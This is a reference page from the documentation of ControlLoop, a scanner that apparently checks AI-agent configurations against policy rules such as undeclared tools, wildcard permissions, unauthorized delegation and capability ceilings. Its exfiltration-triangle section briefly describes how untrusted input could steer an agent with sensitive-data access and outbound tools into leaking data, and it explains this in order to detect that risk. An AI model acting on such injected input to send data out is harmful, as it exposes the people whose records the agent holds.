---
type: reference
title: Concrete policy rules
tags:
  - reference
  - policy
created: 2026-08-20
---

# Concrete policy rules

**Status: Implemented foundation.** All rules described below are
implemented and tested library code in `controlloop.policy.rules`, built
on the [deterministic rule engine](rule-engine.md) and
the [finding model](finding-model.md). **`controlloop
scan` and `controlloop gate` both consume every registered rule** via
`ALL_RULES` (see the [CLI reference](cli.md#scan)). This page is
extended by one section per rule as each one lands. See the
[fixture corpus inventory](fixture-corpus.md) for the exact
positive and negative test coverage each rule already has.

**Every rule section below carries a real, stable anchor** (an explicit
`<a id="...">` immediately before its heading, derived from the rule's
own `RULE_ID` -- see `controlloop.policy.rules._shared.
documentation_url`) and a **Why this matters** / **Example** /
**Remediation** / **False positives** block. Both are
checked by a real, build-time, offline test
(`tests/policy/rules/test_documentation_urls.py`) against the real
`ALL_RULES` registry, so a new rule shipped without a matching anchor or
without that content fails CI rather than silently landing undocumented.

The first seven rules -- undeclared tools, newly introduced destructive
or financial action, broad or wildcard permission, sensitive write
without declared approval, missing action logging on a privileged tool,
unauthorized delegation, and unresolved dynamic tool registration --
share one design (below). [Expiring repo-local
suppressions](suppressions.md) are a suppression *mechanism*, not a
detection rule, and depend on [Severity, confidence, and
thresholds](policy-thresholds.md); they are not covered on this page.
Three more rules follow the same shared design: capability ceiling
evaluation, exfiltration triangle detection, and hardcoded secret
material (see "Hardcoded secret material" below for the two
architectural gaps that blocked it and how they were resolved). All
three are independent
detections that happen to share this registry page and `ALL_RULES` — see
"Capability ceiling evaluation and exfiltration triangle detection:
independent rules" below for why neither of the first two needed to
coordinate with the other; hardcoded secret material is independent of
both for the same reason (it reads its own dedicated diagnostic codes,
not any other rule's output).

## Why a rule module exposes two functions, not one

`Rule.evaluate`'s signature is fixed by the rule engine's own
contract: `Callable[[RuleContext], tuple[RuleObservation, ...]]`. A
`RuleObservation` is deliberately minimal (a rule ID, a message, and
evidence) — it cannot carry severity, confidence, the affected agent, a
capability path, change state, remediation, or a documentation URL, all of
which a real `Finding` requires. Every rule module in
`controlloop.policy.rules` therefore exposes:

- `evaluate(context) -> tuple[RuleObservation, ...]` — the engine-compatible
  function `Rule.evaluate` is set to.
- `findings(context, ...) -> tuple[Finding, ...]` — a disclosed convenience
  bridge, calling `controlloop.findings.finding_from_observation` with the
  extra context the rule already computed while it still has `RuleContext`
  in hand. Not part of the engine contract; `scan` and `gate` call it to
  assemble the finding stream from every registered rule, and it proves
  each rule produces a real `Finding`.

Both functions are pure views over one shared, private per-rule detection
computation, so they can never disagree with each other.

`controlloop.policy.rules.ALL_RULES` is a plain tuple of every rule this
package currently defines, in a fixed, explicit order — a convenience for
a caller (`scan`, `gate`, or this package's own tests) to pass to
`controlloop.policy.engine.evaluate` without importing every rule module
by hand. It is not itself rule-pack versioning: it carries no version, no
enable/disable state, and is not what `controlloop --version` reports
(`controlloop.policy.rulepack.CURRENT_RULE_PACK` is — see [Rule pack
versioning](rule-pack-versioning.md)). **`CURRENT_RULE_PACK` carries
every rule on this page**, each paired with a decided `RuleMetadata`
governance flag, at a version with a hand-computed pinned fingerprint
(see [Rule pack versioning](rule-pack-versioning.md) for the history) —
a disclosed, reviewable proposal, not a mechanical derivation; see
`controlloop.policy.rules`'s own module docstring for the full
reasoning.

<a id="undeclared-tools"></a>
## Undeclared tools

**Outcome:** a tool an agent can reach — directly, or transitively through
delegation — that is not declared anywhere in the repository's
`controlloop.yaml` manifest is reported by name, with where it was
discovered. With no manifest at all, the rule reports how many reachable
tools exist and says a manifest would improve the result, without failing.

**Why this matters:** a manifest is the one place a human records "these
are the tools I intended this agent to have." A tool the scan discovers
but the manifest never names is either an intentional grant nobody wrote
down, or a capability that arrived by accident — a dependency bump, a
copy-pasted config, a delegation chain nobody traced end to end. Either
way, it is authority no reviewer signed off on in writing.

**Example:** a `refund-agent` MCP configuration gains a `delete-database`
tool entry after a config merge. Nothing in `controlloop.yaml` names
`delete-database`. The finding reports the tool, the agent that reaches
it, and the path (direct or through delegation) that connects them.

**Remediation:** add an `approvals` entry naming the tool's capability in
`controlloop.yaml` if the access is intended, or remove the agent's
access to it (delete the MCP entry, tighten the manifest's delegation, or
revoke the underlying credential) if it is not.

**False positives:** none in the strict sense — the rule reports exactly
what is reachable and undeclared, never a guess. The common "noisy but
correct" case is a repository with no manifest yet, or one that has not
been updated after a recent capability change; both are real gaps the
finding is naming accurately, not detection error.

`controlloop.policy.rules.undeclared_tools`:

- Computes every path from an agent to a tool node — one-hop
  (`compute_direct_capability_paths`) and bounded multi-hop
  (`compute_transitive_capability_paths`), both from
  `controlloop.capability.compute` — over the current ACBOM alone. A tool
  reachable by more than one distinct agent, or by more than one distinct
  path from the same agent, is reported once per distinct
  `(agent, path)` fact, never collapsed away or silently dropped.
- **What "declared" means, disclosed.** `ManifestDocument` has
  no dedicated declared-tools field. This rule treats a tool as declared
  when its name exactly matches some `Approval.capability` in the
  manifest — the only existing field expressing "the owner has recorded
  this named capability." This is a narrow, considered reading of an
  existing field, not an invented one. A dedicated `declared_tools` (or
  similarly named) field would fit more precisely and is recommended
  follow-up.
- With no manifest present, the rule returns one advisory
  `RuleObservation` stating the count of reachable tools and recommending a
  manifest, and raises nothing. This advisory has no natural single
  affected agent (it is repository-wide), so it is never promoted to a
  `Finding` through `findings()` — only `evaluate()` reports it.
- Severity `medium`, confidence `high` (both fixed values; no configurable
  threshold exists yet — see [Policy severity, confidence, and
  thresholds](policy-thresholds.md)). `change_state` is always
  `not-compared`: this rule does not read `RuleContext.diff` at all.

<a id="destructive-or-financial-action"></a>
## Newly introduced destructive or financial action

**Outcome:** a change that gives an agent a destructive or financial
action it did not previously have — directly, or transitively through a
newly added relationship edge — is reported at high severity, with the
path that delivers it.

**Why this matters:** an agent that could only read data yesterday and
can delete a database or issue a refund today is the single most
consequential kind of capability change this product can catch. Destructive
and financial actions are exactly where an unreviewed expansion turns
into real-world damage — data loss or money moving — so a *newly
granted* one deserves attention a long-standing one may not.

**Example:** a pull request adds a `process-refund` tool to a customer-
support agent's MCP configuration. The agent previously had no financial
action. Compared against the baseline, this rule reports the new
`invokes` edge to `process-refund` (`FINANCIAL_ACTION`) at `high`
severity, naming the exact path.

**Remediation:** confirm the new capability was intentional and reviewed;
if so, no action beyond acknowledgment is needed. If it was not — a
transitive side effect of an unrelated delegation change, or a
misconfigured tool grant — remove the edge (revoke the tool access, or
narrow the delegation) that introduced it.

**False positives:** requires a baseline (`RuleContext.diff`) to fire at
all — a repository scanned without one reports nothing here, by design,
rather than treating every existing destructive/financial capability as
newly discovered. A capability correctly classified as destructive by
`security_attributes` but genuinely low-risk in context (a soft-delete
with recovery, a sandboxed financial simulation) still fires; the rule
does not evaluate consequence severity, only the fact of the grant.

`controlloop.policy.rules.destructive_or_financial_action`:

- Classifies using `controlloop.capability.taxonomy.classify_material_capability`
  unmodified — never a keyword list — checking for
  `MaterialCapabilityClass.DESTRUCTIVE_ACTION`/`FINANCIAL_ACTION`, read from
  the **target node's** `security_attributes` plus the actioning edge's
  type (matching how `tests/concepts/reference_fixture.py`'s own
  `billing-db` resource carries `destructive=True` on the node, not the
  edge).
- **Direct case:** every `RuleContext.diff.effective_authority_changes`
  entry with `kind is ADDED` — a real, already-computed diff fact. With no `RuleContext.diff` at all, this rule reports nothing:
  "newly gained... against an unchanged baseline" has no meaning without a
  baseline, and reporting every existing destructive/financial capability
  unconditionally would be exactly the low-confidence noise this
  codebase's product principles warn against.
- **Transitive case, disclosed.** `EffectiveAuthorityChange` is only ever
  a direct, one-hop fact by construction, and `DiffResult` carries no
  `capability_path_changes` — this codebase has no diffed transitive-path
  collection anywhere a rule can reach, and `RuleContext` exposes no
  baseline graph to recompute one from scratch. Instead: for every edge in
  `context.diff.edge_changes` confirmed newly `ADDED` whose type is one a
  transitive walk chains through (`invokes`, `delegates-to`,
  `authenticates-as`, `permitted-by`), this rule recomputes
  `compute_transitive_capability_paths` over the *current* graph and
  reports every resulting path that both traverses that new edge and
  reaches a destructive/financial target. **Empirically confirmed while
  building this**: a `reads`/`writes` action edge is never part of any
  transitive path — a destructive *resource* is always reached directly
  (the case above), never transitively; a genuinely transitive finding
  needs a destructive/financial **tool** (or identity/permission/data
  class) reached through delegation or invocation.
- Severity is fixed at `high`. Confidence is not invented — it reuses whichever already-computed
  confidence is closest to the fact (`EffectiveAuthorityChange.after.confidence`
  for the direct case, `CapabilityPath.confidence` for the transitive
  case).

<a id="broad-permission"></a>
## Broad or wildcard permission

**Outcome:** wildcard and overly broad permission grants are reported with
the breadth they actually confer, whether discovered via IAM, MCP, or
OpenAPI.

**Why this matters:** the principle of least privilege is the single most
common security review finding across every real system, and agent
tooling is no exception. A `s3:*` or `*` scope grants far more than any
single agent task needs, and every over-broad grant is attack surface
that did nothing to earn its place — if the agent is ever compromised,
tricked, or simply buggy, an overly broad scope is what turns a small
mistake into a large one.

**Example:** an IAM policy statement grants `"Action": "s3:*"` on a
bucket an agent only ever reads from. The rule reports this as a
confirmed wildcard at `high` severity, naming the actual permission
scope discovered.

**Remediation:** narrow the grant to exactly the actions the agent's own
task requires (for example, `s3:GetObject` in place of `s3:*`). Where a
condition already restricts the grant but a wildcard action remains,
tighten the action list first — a condition is not a substitute for
scope.

**False positives:** a grant restricted only by an unevaluated IAM
condition (no wildcard action) is intentionally reported at reduced
`medium` severity, not `high` — the rule already distinguishes "broad
and unconditional" from "broad but conditioned." A wildcard scope that
is provably unreachable from any agent today (no path connects it yet)
still surfaces as an advisory observation, since that is exactly the
kind of latent risk worth knowing about before a future path makes it
reachable.

`controlloop.policy.rules.broad_permission`:

- Reads only `NodeType.PERMISSION` nodes' `SecurityAttributes.permission_scopes`
  — a generic canonical field, not an IAM-specific representation, so this
  rule has no adapter-name branch and would behave identically for an
  MCP- or OpenAPI-sourced `Permission` node populating the same field the
  same way.
- **Disclosed duplication.** `controlloop.adapters.iam._encode_scope`
  replaces a literal `*` with the token `WILDCARD` inside a
  scope string, and appends the private literal `"condition:present"`
  when a statement carries an unevaluated condition. Both are private,
  adapter-internal constants this rule duplicates rather than imports
  (the same self-containment precedent `controlloop.capability.compute`
  already accepts for its own private edge-type constant) — a real,
  disclosed coupling: if this vocabulary ever changes in `iam.py`, this
  rule's detection silently stops matching it. Promoting both tokens to a
  shared, public constant is recommended follow-up.
- A confirmed wildcard is `high` severity/confidence. A grant restricted
  only by an unevaluated condition (no wildcard) is reported at reduced
  `medium` severity/confidence — "*potentially* broad" is a weaker claim
  than a confirmed wildcard, and this rule reflects that difference rather
  than treating both identically.
- A broad `Permission` node no path in the current graph reaches from any
  agent (a realistic state for IAM discovery before an identity chain
  links it to a specific agent) is still reported — as an advisory
  `RuleObservation` via `evaluate()`, never silently dropped — but is
  never promoted to a `Finding` through `findings()`, the same
  "unknown, never omitted" posture as the undeclared-tools rule's
  no-manifest case.

<a id="sensitive-write-without-approval"></a>
## Sensitive write without declared approval

**Outcome:** a write to a resource carrying a sensitive data class, with
no corresponding approval in the manifest, is reported. An approval that
has expired does not suppress the finding.

**Why this matters:** writing to sensitive data (customer records,
credentials, financial data) is exactly the kind of action a human
should have deliberately signed off on in advance, not discovered after
the fact. Requiring a declared, unexpired approval turns "we assume this
is fine" into "someone actually said this is fine, on this date."

**Example:** an agent writes to a `customer-pii` resource classified
`restricted`. No `approvals` entry in `controlloop.yaml` names that
resource's capability, or the one that does has an `expires_at` in the
past. The finding reports the write and the missing/expired approval.

**Remediation:** add a current, unexpired `approvals` entry naming the
resource's capability if the write is sanctioned, or remove the agent's
write access if it is not. A previously valid approval that lapsed needs
a deliberate renewal, not a silent extension.

**False positives:** the rule only evaluates direct `writes` edges — a
sensitive write reached only transitively through an intermediate tool
is a disclosed limitation, not flagged (a real gap, not a false
negative you should assume is covered elsewhere). Sensitivity is drawn
from *either* the manifest's own `data_classification` or the resource
node's discovered `security_attributes` — a resource the manifest never
classified but an adapter marks sensitive still fires, which is the
intended, conservative behavior, not a misfire.

`controlloop.policy.rules.sensitive_write_without_approval`:

- A resource is sensitive when *either* source says so: the
  manifest's `ManifestDocument.data_classification`, matched by resource
  name, or the resource node's own adapter-supplied
  `SecurityAttributes.sensitivity`/`.data_classifications`, read through
  `controlloop.capability.taxonomy`'s `SENSITIVE_DATA_ACCESS` class — the
  same taxonomy several other rules on this page reuse rather than a
  second, parallel judgment.
- "Declared approval" reuses the undeclared-tools rule's own convention: `Approval.capability` matching the written resource's
  `Node.name`.
- **A small, disclosed, additive manifest schema extension backs
  approval expiry.** The `Approval` model originally had no expiration
  concept at all. `Approval.expires_at: SafeText | None = None` (an RFC
  3339 timestamp exactly as supplied, unenforced at the model layer, the
  same posture `ApprovalProvenance.approved_at` already established) is
  additive and minor-compatible, still schema version `1.0.0`, the same
  precedent the `ceilings` field already set for this exact schema. The
  packaged JSON Schema and its golden digest reflect this field together
  with the independent `logged_tools` addition (see [Missing action
  logging](#missing-action-logging) below); one regenerated schema and
  one golden digest cover both.
- **Expiry is decided entirely outside the rule engine, by design.** The
  engine's own documented determinism guarantee ("identical `(rules,
  context)` always produces byte-identical output") means a rule must
  never read a real clock. `controlloop.manifest.approvals.is_approval_active`
  /`active_approvals` are new, small, pure functions taking an explicit
  `as_of` — entirely outside `RuleContext`. The rule itself never calls
  either function and never reads a clock: it only ever inspects whatever
  `context.manifest.approvals` it is given. A manifest-loading caller is
  expected to call `active_approvals` before constructing that
  `RuleContext`, so an expired approval is simply never present for the
  rule to see. An unparseable `expires_at` is treated as already expired
  (fail closed).
- Considers only a direct `writes` edge from an agent to a resource — a
  sensitive write reached only transitively (through an intermediate
  tool) is a disclosed limitation, not detected by this rule.

<a id="missing-action-logging"></a>
## Missing action logging on a privileged tool

**Outcome:** a privileged tool with no declared logging or audit path
is reported, because an unlogged privileged action is unreviewable
after the fact.

**Why this matters:** when something goes wrong with a privileged action
— a bad refund, a wrongful delete — the first question is always "what
actually happened, and when?" Without a declared audit path, there is no
answer. Logging is not a nice-to-have on privileged tools; it is the
only way a privileged action's history can ever be reconstructed.

**Example:** a `refund-agent` invokes a `process-refund` tool, which
`classify_material_capability` marks `FINANCIAL_ACTION`. No `logged_tools`
entry in `controlloop.yaml` names `process-refund`. The finding reports
the tool, the agent, and the one-hop path that reaches it.

**Remediation:** add a `logged_tools` entry naming the tool and an
`audit_path` (a repository-relative log path, or an external system
identifier such as `datadog:agent-audit-log`) once real logging exists
for that tool's invocations. Declaring a path that logging does not
actually write to defeats the purpose — this rule checks the manifest's
own claim, not that logging is real; make it real first.

**False positives:** a tool the taxonomy cannot classify (`unclassified`)
is treated as privileged, not safe-by-default — an intentional
conservative choice, so an unusual or adapter-specific tool without a
recognized shape still gets flagged rather than silently passing. This
means a genuinely low-risk, unclassifiable tool can surface here; the
fix is either to declare its audit path anyway (cheap and always
correct) or to improve the taxonomy's own classification coverage.

- **Privilege** is determined by the [material capability
  taxonomy](material-capability-taxonomy.md): a `TOOL` node reached by
  at least one `invokes` edge from an agent is privileged when
  `classify_material_capability(tool.security_attributes,
  edge_type=EdgeType.INVOKES)` returns a non-empty set -- including the
  taxonomy's own `unclassified` member, since an unclassifiable tool is
  never treated as safer than a classified one.
- **Suppression** is a new, additive `controlloop.yaml` field:
  `logged_tools`, a list of `{tool, audit_path}` entries (see
  [Manifest schema](manifest-schema.md)). `audit_path` is a free-form
  identifier -- a repository-relative log path, or a system identifier
  such as `datadog:agent-audit-log` -- never validated against a real
  filesystem or service.
- A tool invoked by two different agents produces two independently
  agent-scoped `Finding`s, since `Finding.affected_agent` is required.
- `Finding.capability_path` is the one-hop agent-to-tool path from
  `compute_direct_capability_paths`.

<a id="unauthorized-delegation"></a>
## Unauthorized delegation

**Outcome:** delegation to an agent the manifest does not permit is
reported, including delegation discovered transitively.

**Why this matters:** delegation is how one agent's authority becomes
another agent's authority. An undeclared delegation edge means the
manifest's own picture of "which agents can act on whose behalf" is
wrong — and every downstream capability analysis (ceilings, exfiltration
detection) that trusts the manifest inherits that blind spot.

**Example:** a `triage-agent` gains a `delegates-to` edge to a
`refund-agent` that `triage-agent`'s `allowed_delegation` set in
`controlloop.yaml` never names. The finding reports the disallowed edge,
elevated in severity if the two agents also cross a declared trust
boundary.

**Remediation:** add the target agent to the delegating agent's
`allowed_delegation` entry if the delegation is intentional, or remove
the delegation relationship (revoke whatever configuration created it)
if it is not.

**False positives:** with no manifest at all, or no `allowed_delegation`
entry for the delegating agent, *every* discovered delegation is
reported — a deliberate "no declared allowed set is never treated as
everything is allowed" posture, not a bug. A disallowed delegation to an
agent with no further discovered capability of its own is still counted
by the rule's own `evaluate()` observation, but has no path to attach a
`Finding` to (a disclosed schema boundary, not a missed detection).

- A `delegates-to` edge from an agent whose target -- by declared name
  -- is outside that agent's `allowed_delegation` set produces a
  finding. With no manifest, or no entry for that agent, every
  discovered delegation is reported (no declared allowed set is never
  treated as "everything is allowed").
- Severity is elevated when trust boundaries are declared at all and
  the delegating and target agent do not share one.
- **`controlloop.manifest.reconciliation.reconcile_manifest` already
  flags an `allowed_delegation` entry an agent
  *has* that discovery contradicts**, as a `MANIFEST-CONTRADICTS-DISCOVERY`
  diagnostic. This rule is deliberately broader: it also flags an agent
  with **no** `allowed_delegation` entry at all, adds trust-boundary
  severity elevation, and reports through the finding layer. The two
  are independent, non-duplicative checks over the same manifest
  fields.
- **Disclosed scope boundary:** `Finding.capability_path`'s
  `target_type` is closed to `tool`, `resource`, `identity`,
  `permission`, and `data-class` -- deliberately excluding `agent`. A
  disallowed `delegates-to` edge to an agent with **no** further
  discovered capability has no valid `CapabilityPath` to attach a
  `Finding` to under the current schema. `evaluate()`'s
  `RuleObservation`s cover every disallowed edge unconditionally;
  `findings()` covers exactly the delegation chains that reach a real
  capability beyond the disallowed target, via
  `compute_transitive_capability_paths`.

<a id="unresolved-dynamic-registration"></a>
## Unresolved dynamic tool registration

**Outcome:** code that registers tools at runtime, which static
analysis cannot enumerate, is reported as an unknown rather than
passing silently.

**Why this matters:** this codebase's own worst failure mode is a
silently dropped capability that produces a confident pass. Code that
builds its tool list at runtime (reading a config file, calling an API,
branching on an environment variable) is exactly the case static
analysis cannot fully enumerate — and rather than pretend the scan saw
everything, this rule surfaces the gap honestly.

**Example:** an OpenAI Agents SDK module declares
`Agent(name="Support", tools=load_tools_from_config())`. The adapter
emits an `INCOMPLETE-DYNAMIC-REGISTRATION` diagnostic at that line and
keeps an `"unknown"` tool node, `unresolved-tools:Support`, linked to
it by the same line. This rule reports a `medium` finding naming the
file, the line, and the agent, rather than letting the gap sit only in
the raw diagnostics array.

The CrewAI, LangGraph, and OpenAI Agents SDK adapters emit the
diagnostic when a tool list (CrewAI `tools=`, LangGraph `bind_tools`
and `ToolNode`, OpenAI Agents `tools=` and `handoffs=`) is:

| Shape | Example |
| --- | --- |
| A comprehension | `tools=[make(t) for t in config]` |
| A call | `tools=load_tools()` |
| A splat | `tools=[*base_tools]`, `tools=[search, *extra]` |
| A conditional expression | `tools=[search] if online else []` |
| A list the module builds | `tools=TOOLS` after `for f in found: TOOLS.append(f)` |
| Added after construction | `agent.tools.append(...)`, `agent.tools.extend(...)` |

A bare name the module does not build (`tools=TOOLS` imported from
elsewhere) is still `INCOMPLETE-UNRESOLVED-REFERENCE`, which this rule
does not report: it is a reference the adapter declined to follow, not
a registration at runtime. A literal list produces neither.

**Remediation:** there is no code change this rule itself asks for — it
is disclosing an analysis limitation, not a policy violation. Reducing
the finding means making the registration statically enumerable (a
fixed tool list, or a manifest declaration naming the possible tools)
if that is feasible for the use case.

**False positives:** none in the sense of a wrong detection — the rule
fires exactly when an adapter already flagged a location as
dynamically-registered and incomplete. A tool that is *also* discovered
statically and confidently elsewhere never fires here just because an
unrelated dynamic-registration diagnostic exists somewhere else in the
same document.

- Recognizing a dynamic-registration *pattern* in source code is
  adapter work, out of a rule's reach by architecture (a rule reads
  only `RuleContext`, never raw repository content). This rule's job is
  narrower and adapter-agnostic: given an ACBOM that already contains
  such a diagnostic, surface it as a policy-level finding.
- A dynamic `handoffs=` list in the OpenAI Agents SDK produces the
  diagnostic but no placeholder node, since a handoff target is an
  agent and inventing one would be a made-up identity. It is reported
  through `evaluate()`'s observations and the scan's diagnostics, not
  as a `Finding`.
- `evaluate()` reports one `RuleObservation` per matching diagnostic
  unconditionally. `findings()` additionally correlates a diagnostic to
  a real, already-discovered `TOOL` node at `Confidence.UNKNOWN` whose
  own evidence shares a location with the diagnostic, reached by an
  `invokes` edge -- giving a valid `CapabilityPath`. A
  dynamic-registration diagnostic with no correlated node is still
  fully covered by `evaluate()`, just not materializable as a `Finding`.
- A statically enumerable, confidently discovered tool never fires,
  even alongside an unrelated dynamic-registration diagnostic elsewhere
  in the same document.
- The finding participates in completeness state by construction: it
  only ever fires from a diagnostic that is already `incomplete=True`
  and already part of `ACBOMDocument.diagnostics`, so
  `controlloop.acbom.completeness.completeness_summary` already reports
  it independent of this rule.

<a id="capability-ceiling"></a>
## Capability ceiling evaluation

**Outcome:** effective authority is evaluated against the declared
ceiling and any capability outside it produces a ceiling-breach
finding, including expansion no pattern rule anticipated -- this is
ControlLoop's differentiator: every other rule on this page is a denylist,
catching a specific, named shape of risk; a [declared capability
ceiling](capability-ceiling.md) is an allowlist boundary instead, and
this rule is what decides whether a specific discovered capability
actually crosses it.

**Why this matters:** every other rule on this page catches a specific,
named shape of risk it already knows to look for. A ceiling breach
catches everything else — any capability expansion, however novel or
unanticipated, that crosses a boundary a human explicitly drew. This is
what makes a ceiling different from a pattern-matching rule: it does not
need to have seen this exact risk shape before to catch it.

**Example:** `controlloop.yaml` declares `refund-agent`'s ceiling
prohibits reaching `delete-database`. A later change adds a delegation
chain that lets `refund-agent` reach it transitively, through a tool
neither the ceiling's author nor any other rule anticipated. This rule
reports a `critical` finding naming the full hop chain that crosses the
boundary.

**Remediation:** narrow the discovered capability (remove the tool
access, delegation edge, or permission that crosses the boundary), or —
if the newly reached authority is genuinely intended — update the
declared ceiling in `controlloop.yaml` to reflect the deliberate
decision to widen it.

**False positives:** a repository with no declared ceiling at all is
never failed for the absence — it gets one informational observation,
never a finding. A capability reached only at `Confidence.UNKNOWN`, or
through a transitive walk that hit its own traversal bound, is reported
as *unverifiable* against the ceiling, never as a confident breach —
disclosing "this scan could not prove compliance" rather than either a
false pass or a false breach.

- Every direct and transitive `CapabilityPath` reachable by an agent
  with a declared ceiling is scanned for a breach: any hop carrying a prohibited action type; the final
  target's name matching a prohibited resource or external
  destination; the final target's sensitivity matching a prohibited
  data class; or any hop a disallowed `delegates-to` edge. A breach
  reached only transitively is caught the same way, with the finding's
  own `capability_path` carrying the full hop chain, not just the
  offending edge.
- `prohibited_resources` and `prohibited_external_destinations` are
  matched identically -- by the final target node's own name -- since
  neither category has a distinct canonical node type in this codebase
  to tell them apart at the graph level; the two ceiling fields exist
  for a human author's own intent.
- **A repository with no declared ceiling is not failed for its
  absence.** `evaluate()` returns exactly one informational
  `RuleObservation` stating no capability ceiling is declared, and
  never a `Finding`, when the manifest is absent or declares no
  ceilings at all.
- **A breach is independent of every other registered rule**, not
  merely "not currently disabled": this rule imports no other rule
  module and calls no other rule's detection function, so it fires the
  same way whether every other rule in this package is registered,
  enabled, or disabled via policy configuration. (This rule is itself
  classified `RuleMetadata.mandatory=True` in `CURRENT_RULE_PACK` -- see
  "Known limitations" below.)
- **A capability reached at `Confidence.UNKNOWN`, or behind a
  transitive walk that hit its own bound, is reported as unverifiable
  against the ceiling -- never as compliant.** Both are advisory
  `RuleObservation`s only, never a `Finding`: there is no specific
  breached capability to attach one to, only an honest disclosure that
  this scan could not prove compliance.
- **Disclosed scope boundary**, mirroring [unauthorized
  delegation](#unauthorized-delegation)'s identical,
  already-disclosed gap: a bare disallowed `delegates-to` edge to an
  agent with **no** further discovered capability has no valid
  `CapabilityPath` to attach a `Finding` to (`CapabilityPath.target_type`
  structurally excludes `agent`). `evaluate()`'s `RuleObservation`s
  cover every disallowed edge unconditionally; `findings()` covers only
  chains that reach a real capability beyond the disallowed agent.
- Severity is always `FindingSeverity.CRITICAL`, the most severe level
  this codebase defines.

<a id="exfiltration-triangle"></a>
## Exfiltration triangle detection

**Outcome:** when one agent combines sensitive-data access, untrusted
input, and outbound communication, this is reported as a single
top-severity finding naming all three legs and their paths, rather than
three unrelated findings -- provable structurally from the graph, never
by pattern-matching content or names. It builds on the deterministic
rule engine, the material capability taxonomy, and bounded transitive
capability paths.

**Why this matters:** each of the three legs alone — reading sensitive
data, accepting untrusted input, or communicating externally — is often
completely legitimate. The combination is the actual risk: an agent that
reads sensitive data, takes instructions from an untrusted source, and
can talk to the outside world is structurally positioned for its
untrusted input to redirect its sensitive data somewhere it should not
go — the classic prompt-injection-to-exfiltration path, caught from
graph structure alone, without needing to see the injection itself.

**Example:** a `support-agent` reads `customer-records` (sensitive-data
access), receives input from an external ticket-submission form
(untrusted input), and invokes a `send-webhook` tool marked
`external_communication` (outbound communication). All three legs
present produces one `critical` finding naming all three paths.

**Remediation:** break the triangle at whichever leg is least essential
to the agent's actual task — remove the outbound-communication path if
it is not truly needed, restrict the sensitive-data access to a narrower
resource, or constrain which inputs are treated as untrusted (for
example, validating or sanitizing the ticket-submission source).
Removing any one leg fully resolves the finding.

**False positives:** exactly two legs present with the third confirmed
*absent* produces nothing — this is not a near-miss the rule is hiding,
it genuinely does not fire. Two present with the third merely *unknown*
produces a lower-severity, explicitly `Confidence.UNKNOWN`-qualified
finding naming which leg is unproven, rather than either staying silent
or claiming certainty it does not have.

`controlloop.policy.rules.exfiltration_triangle` evaluates three "legs"
per agent, reusing existing graph properties rather than inventing new
ones:

- **Sensitive-data-access** and **external-communication** each read
  `controlloop.capability.taxonomy.classify_material_capability`
  (unmodified) against every node an agent reaches -- directly
  (`compute_direct_capability_paths`) or transitively, up to the bound
  (`compute_transitive_capability_paths`, also unmodified).
  Each of these two legs is evaluated tri-state: present (the taxonomy
  class matches), unknown (the one relevant `SecurityAttributes` field
  -- `sensitivity` or `external_communication` -- is the literal
  `"unknown"`), or absent.
- **Untrusted input** has no direct member in
  `MaterialCapabilityClass` at all. This rule represents it
  structurally: any `receives-from` edge sourced at the agent, to any
  node, regardless of `SecurityAttributes` -- mirroring
  `classify_material_capability`'s own precedent that `writes` and
  `delegates-to` are pure, unconditional edge-type checks, and grounded
  in this codebase's "all input is hostile" invariant (receiving input
  through a `receives-from` edge is definitionally the untrusted case
  in this graph model; nothing represents "trusted input" as a
  separately asserted fact today). No new adapter, node type, or edge
  type is introduced -- `EdgeType.RECEIVES_FROM` already existed,
  already schema-published, unused by any rule until now.
- **Where that edge comes from.** A declaration in `controlloop.yaml`
  ([`external_inputs`](manifest-schema.md#declaring-where-an-agents-input-comes-from-external_inputs))
  is authoritative: the repository states that the agent takes input
  from a named external source, and the leg is *present*. An
  agent-running workflow's start event is likewise present. An A2A
  card's `url` is an *inference*: the agent accepts requests, from whom
  the card cannot say, so the edge carries `untrusted_input: "unknown"`
  and the leg is *unknown*. A confirmed edge always outranks an inferred
  one on the same agent.
- **This leg's transitivity is deliberately direct-only, disclosed as a
  scope boundary, not an oversight.** `compute_transitive_capability_paths`'s
  own edge-type set does not include `receives-from`, and
  `CapabilityPath.target_type` excludes the `trigger` node type a
  `receives-from` edge naturally targets -- both protected contracts
  this rule does not alter. The "reachable only transitively" fixture
  is demonstrated instead through the
  external-communication leg (an agent invoking a tool that itself
  invokes a second tool carrying `external_communication=true`).
- This rule fires only when at least two of the three legs are
  definitively present: all three present produces one
  `critical`-severity finding naming all three legs and describing each
  one's own path; exactly two present plus the third `unknown`
  produces one `high`-severity, `Confidence.UNKNOWN` qualified finding
  stating which leg is unproven rather than silence or a
  confident claim -- except when the unproven leg is an *inferred*
  input, which produces the same qualified finding at `medium`, below
  the default gate threshold, so an inference alone never blocks; two
  present with the third confirmed absent, or fewer than two present
  regardless of unknowns, produces nothing.
- `Finding.capability_path` is singular and closed to five node types
  that exclude the untrusted-input leg's natural target, so it cannot
  literally hold three paths. It is deterministically set to the
  external-communication leg's path when that leg is present (the
  actual "exfiltration step"), falling back to the sensitive-data-access
  leg's path otherwise; the untrusted-input leg is never eligible, but
  is always named in the finding's message and represented in its
  combined, deduplicated `evidence`.
- `change_state` is always `not-compared` -- this rule detects a
  structural pattern on the current graph, not a change against a
  baseline, the same choice `broad_permission`/`undeclared_tools` made.

**Disclosed limitation:** two distinct triangles sharing the same
canonical path but differing only in which `receives-from` edge supplies
the untrusted-input leg collapse to the same `Finding.id`, since finding
identity does not include untrusted-input evidence.

## Capability ceiling evaluation and exfiltration triangle detection: independent rules

These two rules were built separately and are **deliberately
independent by design, not merely by accident of timing.** The
exfiltration triangle rule deliberately does not evaluate the triangle
pattern against a manifest ceiling; that is the capability ceiling
rule's job. Concretely:

- Capability ceiling evaluation answers "does this agent's authority
  cross a boundary the repository *declared*?" -- it requires a
  `controlloop.yaml` ceiling and says nothing without one.
- Exfiltration triangle detection answers "does this agent structurally
  combine these three graph properties?" -- it needs no manifest at all
  and says nothing about whether that combination was ever declared
  acceptable or prohibited.
- Neither rule imports, calls, or reads the other's output. Both read
  the same underlying `CapabilityPath`/`classify_material_capability`
  primitives independently, so the same agent can legitimately produce
  a finding from both rules at once (for example, an agent whose
  external-communication target is *also* a declared-prohibited
  destination) -- two separate, independently attributed findings, not
  a merged or deduplicated one. This is the same "rules don't coordinate
  with each other" posture every other pair of rules in this package
  already has.
- No coordination between them was added, and none is needed: forcing
  one to consult the other would blur exactly that boundary, and such a
  widening of scope would need its own review rather than being absorbed
  silently into either rule.

<a id="hardcoded-secrets"></a>
## Hardcoded secret material

**Outcome:** a credential-shaped or high-entropy value committed to the
repository is reported by pattern name, location, and confidence --
never the matched value itself.

